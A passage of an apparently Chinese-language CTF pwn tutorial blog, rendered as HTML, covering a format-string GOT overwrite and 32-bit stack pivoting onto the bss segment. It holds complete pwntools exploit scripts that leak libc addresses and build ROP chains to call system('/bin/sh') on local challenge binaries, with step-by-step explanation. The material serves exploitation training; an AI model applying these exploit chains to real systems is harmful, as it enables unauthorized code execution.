+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;enter the file name you want to get:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;123&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys_addr</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">puts_got</span><span class="p">:</span> <span class="n">sys_addr</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 调用puts写入binsh文件名</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;put&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;please enter the name of the file you want to upload:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;then, enter the content:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 调用get触发fmt,使得puts函数变成system函数</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ftp&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;enter the file name you want to get:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 调用show_dir函数，也就是挟持后的puts函数，getshell</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="栈迁移">栈迁移
+</h2><p>栈迁移分成32位和64位ELF，我们先来学习32位</p>
+<p>栈迁移正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。</p>
+<p>我们可利用该技巧来解决栈溢出空间大小不足的问题。</p>
+<p>栈迁移的核心思想就是：将栈 的  esp 和 ebp 转移到一个“输入不受长度限制的且可控制”的地址处，通常是 bss 段地址！在最后ret 的时候  如果我们能够控制得了栈顶 esp指向的地址就相当于控制了程序执行流！</p>
+<h3 id="32位栈迁移">32位栈迁移
+</h3><p>栈迁移正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。我们可利用该技巧来解决栈溢出空间大小不足的问题。</p>
+<p>回顾一下之前知识</p>
+<p>当我们进入一个函数时，会执行call指令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">call func();    //push eip+4;  push ebp;   mov ebp,esp;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>call指令，先将返回地址（EIP+4）进行push，然后jmp func的地址，最后执行push ebp;  mov ebp,esp;</p>
+</blockquote>
+<p>call func() 执行完要退出的时候要进行与call func相反的操作（恢复现场）维持栈平衡！,也就是leave ret</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1. leave;          //mov esp,ebp;  pop ebp;
+</span></span><span class="line"><span class="cl">2. ret ;           // pop eip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>栈迁移的核心思想就是：将栈 的  esp 和 ebp 转移到一个“输入不受长度限制的且可控制”的地址处，通常是 bss 段地址！在最后ret 的时候  如果我们能够控制得 了栈顶 esp指向的地址就相当于控制了程序执行流！</p>
+<p>先上完整exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#coding:utf8</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./migration&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./migration&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/usr/lib32/libc.so.6&#39;</span><span class="p">)</span><span class="c1">#本地libc文件</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x500</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf1</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x400</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_plt</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">leave_ret</span><span class="o">=</span><span class="mh">0x08048418</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x08048418 : leave ; ret</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">read_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;Try your best :</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">payload1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop1ret</span><span class="o">=</span><span class="mh">0x0804836d</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x0804836d : pop ebx ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span><span class="o">=</span><span class="n">p32</span><span class="p">(</span><span class="n">buf1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop1ret</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="n">read_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="s2">&#34;puts_addr = &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">libcbase</span><span class="o">=</span><span class="n">puts_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span><span class="o">=</span><span class="n">libcbase</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pop3ret</span><span class="o">=</span><span class="mh">0x08048569</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x08048569 : pop esi ; pop edi ; pop ebp ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload3</span><span class="o">=</span><span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">read_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop3ret</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload3</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>checksec一下</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260430114707741.png"
+	width="525"
+	height="143"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260430114707741_hu4984333560677647215.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260430114707741_hu8546786498079088284.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260430114707741"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="367"
+		data-flex-basis="881px"
+	
+></p>
+<p>开启了NX保护和Full RELRO，看一下main函数</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260430114959630.png"
+	width="753"
+	height="281"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260430114959630_hu4018296352237220311.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260430114959630_hu10749421472251234407.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260430114959630"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="267"
+		data-flex-basis="643px"
+	
+></p>
+<p>从题目中可以看出，main函数只给了我们一次输入的机会，也就是不能利用栈溢出来多次使用main函数。</p>
+<p>先看栈长度吧，ida看buf到返回地址是0x28+4,调试一下看看是不是真的</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260524003101905.png"
+	width="1715"
+	height="825"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260524003101905_hu3538033907484888651.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260524003101905_hu2538922257675148298.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260524003101905"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="207"
+		data-flex-basis="498px"
+	
+></p>
+<p>到ebp确实是40，也就是0x28，从伪代码可以看到，我们read可以读入0x40的空间，而buf有0x28的空间，我们可控的空间太少，必须进行栈迁移</p>
+<p><strong>payload1</strong></p>
+<blockquote>
+<p>payload1=&lsquo;a&rsquo;*(0x28)+p32(buf)+p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf)+p32(0x100)</p>
+</blockquote>
+<p>0x28先填满buf变量，然后<code>p32(buf)</code>其实就是后续leave指令把bss+0x500这个地址覆盖ebp，当main函数执行<code>leave;ret</code>的时候,跳转到read函数，这里三个参数就写在后面了，实际执行<code>read(0,bss+0x500,0x100)</code>,这个时候等待输入，后面的payload2就会写在这个bss段上了</p>
+<p><strong>payload2</strong></p>
+<blockquote>
+<p>payload2 = p32(buf1) + p32(puts_plt) + p32(pop1ret) + p32(puts_got)
+payload2 += p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf1) + p32(0x100)</p>
+</blockquote>
+<p>经过payload1的<code>mov esp,ebp</code>,此时是栈是bss+0x500了，上面的<code>leave;ret</code>执行了<code>pop ebp</code>,这里传入bss+0x400,所以现在ebp是bss+0x400,后面这里输入puts函数的got表地址，然后<code>pop ebx;ret</code>(这里随便找个gadget，只要是一个pop就行),也就是把当前参数清空，随后又跳转到read，这里跟上面类似，也就是接下来的payload3将会写到bss+0x400</p>
+<p><strong>payload3</strong></p>
+<blockquote>
+<p>payload3 = p32(buf) + p32(read_plt) + p32(pop3ret) + p32(0) + p32(buf) + p32(0x100)
+payload3 += p32(system_addr) + p32(0xdeadbeef) + p32(buf)</p>
+</blockquote>
+<p>现在栈是bss+0x400，最后一个read用来接收下面的binsh,然后pop掉三个参数，清空参数后跳转到system函数，当前buf是binsh，所以就getshell</p>
+<p>​</p>
 
 </section>
 
